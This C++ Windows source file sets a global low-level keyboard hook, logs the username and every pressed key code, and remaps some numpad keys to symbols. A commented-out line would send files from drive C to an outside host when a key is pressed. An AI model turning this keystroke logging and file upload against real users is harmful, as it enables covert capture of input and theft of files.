
#include "Header.h"

void start() {
	HINSTANCE hInstance;
	HMODULE temp1 = GetModuleHandle(NULL);
	hInstance = temp1;
	Init(hInstance);
}


int Init(HINSTANCE hInstance) {
	HWND hWnd;
	char szClassName[] = "MyClass";
	WNDCLASS WndClass;
	MSG Msg;

	char username[300];
	DWORD username_len = 300 + 1;
	GetUserName(username, &username_len);
	username[username_len] = '\0';
	myLog("username+" + std::string(username));
	//return 0;
	WndClass.style = CS_HREDRAW | CS_VREDRAW;
	WndClass.lpfnWndProc = (WNDPROC)MyWndProc;
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hInstance = hInstance;
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.lpszMenuName = NULL;
	WndClass.lpszClassName = szClassName;

	if (!RegisterClass(&WndClass)) {
		MessageBox(NULL, "Can not register class.", "Error", MB_OK);
	}


	HHOOK hHook;
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelKeyBoardProc, NULL, 0);
	if (hHook == NULL)
	{
		MessageBox(NULL, "Error set Hook", "Error", MB_OK);
	}
	else {
		MessageBox(NULL, "Good send hook.", "We are", MB_OK);
	}

	/*
	//DELETE #################
	HWND hMainWnd;
	hMainWnd = CreateWindow(szClassName, "We are2", WS_OVERLAPPEDWINDOW, 0, 0, 300, 300, NULL, NULL, hInstance, NULL);
	if (!hMainWnd) {
		MessageBox(NULL, "Can not create main window.", "Error", MB_OK);
		return 1;
	}
	ShowWindow(hMainWnd, SW_SHOWNORMAL);
	//DELETE #################
	*/
	myLog("Before while.");
	while (1) {
		if (!GetMessage(&Msg, NULL, 0, 0)) {
			break;
		}
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return Msg.wParam;
}

LRESULT CALLBACK MyWndProc(HWND hWnd, UINT Message, UINT wParam, LONG lParam) {
	/*
	HDC hDC;
	PAINTSTRUCT ps;
	RECT rect;
	switch (Message)

	{
	case WM_PAINT:
		hDC = BeginPaint(hWnd, &ps);
		GetClientRect(hWnd, &rect);
		DrawText(hDC, "Hello, World!", -1, &rect,
			DT_SINGLELINE | DT_CENTER | DT_VCENTER);
		EndPaint(hWnd, &ps);
		break;
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
	}
	return 0;
	*/
	return DefWindowProc(hWnd, Message, wParam, lParam);
}

LRESULT CALLBACK MyLowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN) {
		return workWith_WM_KEYDOWN(nCode, wParam, lParam);
	}

	else if (wParam == WM_KEYUP) {
		return workWith_WM_KEYUP(nCode, wParam, lParam);
	}
	else if (wParam == WM_SYSKEYDOWN) {
		return workWith_WM_SYSKEYDOWN(nCode, wParam, lParam);
	}
	else if (wParam == WM_SYSKEYUP) {
		return workWith_WM_SYSKEYUP(nCode, wParam, lParam);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT workWith_WM_KEYDOWN(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
	int key = cKey.vkCode;
	std::string messageAboutKey = "virtual key: " + std::to_string(key) + " ";
	myLog(messageAboutKey);

	if (0xC0 == key) { //VK_NUMPAD1
		//API_sendFromDiskC("vasa054.pythonanywhere.com/");
		return 1;
	}
	if (0x61 == key) { //VK_NUMPAD1
		sendInputText("[");
		return 1;
	}
	else if (0x62 == key) {//VK_NUMPAD2
		sendInputText("]");
		return 1;
	}
	else if (0x64 == key) {//VK_NUMPAD4
		sendInputText("<");
		return 1;
	}
	else if (0x65 == key) {//VK_NUMPAD5
		sendInputText(">");
		return 1;
	}
	else if (0x67 == key) {//VK_NUMPAD7
		sendInputText("&");
		return 1;
	}
	else if (0x68 == key) {//VK_NUMPAD8
		sendInputText("#");
		return 1;
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT workWith_WM_KEYUP(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
	int key = cKey.vkCode;
	int hideKey[] = { 0x61 ,0x62 ,0x64 ,0x65 ,0x67 ,0x68,0xC0 };
	for (int i : hideKey) {
		if (i == key) {
			return 1;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT workWith_WM_SYSKEYDOWN(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
	int key = cKey.vkCode;
	std::string messageAboutKey = "virtual key SYSTEM: " + std::to_string(key) + " ";
	myLog(messageAboutKey);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT workWith_WM_SYSKEYUP(int nCode, WPARAM wParam, LPARAM lParam)
{
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void sendInputText(std::string text)
{
	INPUT pInput;
	wchar_t wc;
	char ret;
	for (int i = 0; i < text.length(); i++) {
		ret = text[i];
		MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, &ret, 1, &wc, 1);
		pInput.type = INPUT_KEYBOARD;
		pInput.ki.wVk = 0;
		pInput.ki.time = 10;
		pInput.ki.wScan = wc;
		pInput.ki.dwFlags = KEYEVENTF_UNICODE;
		SendInput(1, &pInput, sizeof(pInput));
		pInput.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
		SendInput(1, &pInput, sizeof(pInput));
		Sleep(20);
	}
}